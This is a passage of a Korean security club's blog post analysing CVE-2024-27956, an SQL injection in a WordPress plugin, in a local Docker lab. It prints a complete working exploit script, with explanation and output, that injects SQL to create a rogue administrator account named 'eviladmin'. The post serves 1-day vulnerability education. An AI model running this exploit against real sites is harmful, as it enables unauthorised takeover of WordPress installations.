class="number">8.0</span></span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: exampledb</span><br><span class="line">      MYSQL_USER: exampleuser</span><br><span class="line">      MYSQL_PASSWORD: examplepass</span><br><span class="line">      MYSQL_RANDOM_ROOT_PASSWORD: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - db:/var/lib/mysql</span><br><span class="line"></span><br><span class="line">volumes:</span><br><span class="line">  wordpress:</span><br><span class="line">  db:</span><br></pre></td></tr></table></figure>
+<p>위와 같이 WordPress와 MYSQL을 설정하여 yml 파일로 만들고 아래 명령어로 빌드해주면 된다. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose cveWordPress.yml up</span><br></pre></td></tr></table></figure>
+<p>이후에 localhost:8080에 접속해서 아래와 같은 WordPress 설치 화면이 뜨면 알맞게 빌드된 것이다.<br><img src="/images/3101_250403_image2.png" alt="그림 2. [WordPress 설치 화면]"></p>
+<center><span style="font-size: 90%;">그림 2. [WordPress 설치 화면]</span><br><span style="font-size: 70%;"></span></center><br>
+
+<p>설치를 마쳤으니 실습을 실행하기 전 <code>exploit.py</code> 코드를 살펴보자. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeRequest</span>(<span class="params">payload, <span class="built_in">hash</span>, url</span>):</span><br><span class="line">    host = url.split(<span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;auth&#x27;</span>: <span class="string">b&#x27;\0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;integ&#x27;</span>: <span class="built_in">hash</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpUsage</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] You must run the expoit passing the wordpress URL. \n[+] Example: python exploit.py http://website.com&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verifyArgs</span>(<span class="params">argv</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        helpUsage()</span><br><span class="line"></span><br><span class="line">verifyArgs(sys.argv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for CVE-2024-27956&quot;</span>)</span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line">url = domain+<span class="string">&#x27;/wp-content/plugins/wp-automatic/inc/csv.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#first request (create user)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Creating user eviladmin&quot;</span>)</span><br><span class="line">response = makeRequest(<span class="string">&quot;INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES (&#x27;eviladmin&#x27;, &#x27;$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0&#x27;, &#x27;eviladmin&#x27;, &#x27;eviladmin@gmail.com&#x27;, &#x27;http://127.0.0.1:8080&#x27;, &#x27;2025-04-05 17:31:03&#x27;, 0, &#x27;eviladmin&#x27;)&quot;</span>, <span class="string">&quot;09956ea086b172d6cf8ac31de406c4c0&quot;</span>, url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Tampered query&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;invalid login&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;login required&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Error in the payload&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;DATE&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Not vulnerable&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#second request (give permission)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Giving eviladmin administrator permissions&quot;</span>)</span><br><span class="line">makeRequest(<span class="string">&quot;INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = &#x27;eviladmin&#x27;), &#x27;wp_capabilities&#x27;, &#x27;a:1:&#123;s:13:\&quot;administrator\&quot;;s:1:\&quot;1\&quot;;&#125;&#x27;)&quot;</span>, <span class="string">&quot;bd98494b41544b818fa9f583dadfa2bb&quot;</span>, url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Tampered query&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;invalid login&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;login required&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Error in the payload&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit completed!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] administrator created: eviladmin:admin&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>exploit.py 전체 코드이다. diego-tella 깃허브에서 가져왔다(아래 참고문헌에 url 존재)<br>코드를 부분부분 뜯어서 자세히 살펴보자. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">verifyArgs(sys.argv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for CVE-2024-27956&quot;</span>)</span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line">url = domain+<span class="string">&#x27;/wp-content/plugins/wp-automatic/inc/csv.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>먼저 취약한 위치로 url을 설정한다. domain은 <code>argv[1]</code>으로 설정되어 있는데 실행할 때 넣어주는 인자값을 말한다. Usage가 python exploit.py ‘<a target="_blank" rel="noopener" href="http://website.com'라고/">http://website.com&#39;라고</a> 하면 여기서 argv[1]은 ‘<a target="_blank" rel="noopener" href="http://website.com'이다/">http://website.com&#39;이다</a>. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#first request (create user)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Creating user eviladmin&quot;</span>)</span><br><span class="line">response = makeRequest(<span class="string">&quot;INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES (&#x27;eviladmin&#x27;, &#x27;$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0&#x27;, &#x27;eviladmin&#x27;, &#x27;eviladmin@gmail.com&#x27;, &#x27;http://127.0.0.1:8080&#x27;, &#x27;2025-04-05 17:31:03&#x27;, 0, &#x27;eviladmin&#x27;)&quot;</span>, <span class="string">&quot;09956ea086b172d6cf8ac31de406c4c0&quot;</span>, url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Tampered query&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;invalid login&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;login required&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Error in the payload&quot;</span>)</span><br><span class="line">    quit()</span><br></pre></td></tr></table></figure>
+<p>첫번째 Request이다. user를 추가하는 SQL injection을 넣어서 보낸다. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">makeRequest</span>(<span class="params">payload, <span class="built_in">hash</span>, url</span>):</span><br><span class="line">    host = url.split(<span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;auth&#x27;</span>: <span class="string">b&#x27;\0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;integ&#x27;</span>: <span class="built_in">hash</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+<p>위 makeRequest 함수를 이용해서 보내면 되는데 header들이 맞춰져 있고 data는 앞에서 설명했다시피 <code>q</code>에는 페이로드, <code>auth</code>는 공백, <code>integ</code>는 hash값이다. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#second request (give permission)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Giving eviladmin administrator permissions&quot;</span>)</span><br><span class="line">makeRequest(<span class="string">&quot;INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (</span></span><br><span class="line"><span class="string">    (SELECT ID FROM wp_users WHERE user_login = &#x27;eviladmin&#x27;), &#x27;wp_capabilities&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;a:1:&#123;s:13:\&quot;administrator\&quot;;s:1:\&quot;1\&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="string">)&quot;</span>, <span class="string">&quot;bd98494b41544b818fa9f583dadfa2bb&quot;</span>, url)</span><br></pre></td></tr></table></figure>
+<p>두번째 페이로드는 첫번째 페이로드로 생성한 eviladmin 계정에 admin 권한을 준다. 값들이 잘 보였으면 해서 VALUES 값들을 줄바꿈하였다. wp_user에 있는 eviladmin의 ID를 가져와서 wp_usermeta에 값을 추가하는 SQL 구문이다. 이때 meta_key, meta_value는 각각 <code>wp_capabilities</code>, <code>a:1:&#123;s:13:&quot;administrator&quot;;s:1:&quot;1&quot;;&#125;</code>이다. 이는 WordPress의 admin 권한을 주는 키-값이다. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py http://localhost:8080</span><br></pre></td></tr></table></figure>
+<p>프롬프트에서 실행해주면 된다.<br><img src="/images/3101_250403_image3.png" alt="그림 3. [프롬프트 결과 창]"></p>
+<center><span style="font-size: 90%;">그림 3. [프롬프트 결과 창]</span><br><span style="font-size: 70%;"></span></center><br>
+이제 docker에서 ID: eviladmin, PW: admin으로 로그인이 될 것이다. 
+
+<p><img src="/images/3101_250403_image4.png" alt="그림 4. [eviladmin 로그인]"></p>
+<center><span style="font-size: 90%;">그림 4. [eviladmin 로그인]</span><br><span style="font-size: 70%;"></span></center><br>
+admin 권한을 받았는지도 확인해보자. 
+
+<p><img src="/images/3101_250403_image5.png" alt="그림 5. [eviladmin 권한 확인]"></p>
+<center><span style="font-size: 90%;">그림 5. [eviladmin 권한 확인]</span><br><span style="font-size: 70%;"></span></center><br>
+위와 같이 eviladmin이 관리자 권한으로 설정되어 있는 것을 확인할 수 있다. 
+<br><br>
+
+<h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>보통 취약점 1-day 분석을 한다고 하면 PoC, Exploit, Patch를 공부한다. Patch는 SW적으로 어떻게 취약점을 방어하는지 공부하기 위함인데 이번 취약점은 <code>inc/csv.php</code>를 제거함으로써 패치하여 추가적인 목차를 만들진 않았다.<br>신입 학회원에게 많은 도움이 되었으면 해서 최대한 자세하게 템포 느리게 적다보니 초고 완성까지 오래 걸린 거 같다(그렇게 오래 걸릴 내용은 아닌 거 같은데..)<br>다음 글은 뭘 적을지 고민해봐야겠다.<br><br><br></p>
+<h1 id="참고-문헌"><a href="#참고-문헌" class="headerlink" title="참고 문헌"></a>참고 문헌</h1><p>보안뉴스. (2015, 6월 16). 국내 보안 위협 동향과 대응 방안. <a target="_blank" rel="noopener" href="https://www.boannews.com/media/view.asp?idx=47656">https://www.boannews.com/media/view.asp?idx=47656</a></p>
+<p>이글루코퍼레이션. (n.d.). WordPress Plug-in에 따른 SQL Injection 분석 및 대응 방안 (CVE-2022-3689, CVE-2023-6360). <a target="_blank" rel="noopener" href="https://www.igloo.co.kr/security-information/wordpress-plug-in%EC%97%90-%EB%94%B0%EB%A5%B8-sql-injection-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88-cve-2022-3689-cve-2023-6360/">https://www.igloo.co.kr/security-information/wordpress-plug-in%EC%97%90-%EB%94%B0%EB%A5%B8-sql-injection-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88-cve-2022-3689-cve-2023-6360/</a></p>
+<p>W3Techs. (n.d.). Usage statistics and market share of WordPress for websites. <a target="_blank" rel="noopener" href="https://w3techs.com/">https://w3techs.com/</a></p>
+<p>위키백과. (n.d.). SQL. <a target="_blank" rel="noopener" href="https://ko.wikipedia.org/wiki/SQL">https://ko.wikipedia.org/wiki/SQL</a></p>
+<p>truonghuuphuc. (2024). CVE-2024-27956. GitHub. <a target="_blank" rel="noopener" href="https://github.com/truonghuuphuc/CVE-2024-27956/tree/main">https://github.com/truonghuuphuc/CVE-2024-27956/tree/main</a></p>
+<p>하온 블로그. (n.d.). SQL Injection이란? 원리, 예시와 방어 방법. <a target="_blank" rel="noopener" href="https://haon.blog/haon/server/sql-injection/">https://haon.blog/haon/server/sql-injection/</a></p>
+<p>Patchstack. (2024, March 20). Critical vulnerabilities patched in WordPress Automatic Plugin. <a target="_blank" rel="noopener" href="https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve">https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve</a></p>
+<p>diego-tella. (2024). CVE-2024-27956-RCE. GitHub. <a target="_blank" rel="noopener" href="https://github.com/diego-tella/CVE-2024-27956-RCE">https://github.com/diego-tella/CVE-2024-27956-RCE</a></p>
+<p>DreamHost. (n.d.). A Guide to WordPress User Roles and Permissions. <a target="_blank" rel="noopener" href="https://www.dreamhost.com/blog/wordpress-user-roles/">https://www.dreamhost.com/blog/wordpress-user-roles/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web-Hacking/" rel="tag"># Web Hacking</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/05/31/monthly_24_05/" rel="prev" title="[5월호] Kernel Use-After-Free">
+                  <i class="fa fa-angle-left"></i> [5월호] Kernel Use-After-Free
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/05/17/3102_250517/" rel="next" title="지원서 뜯어보기 [중]">
+                  지원서 뜯어보기 [중] <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">SWING</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
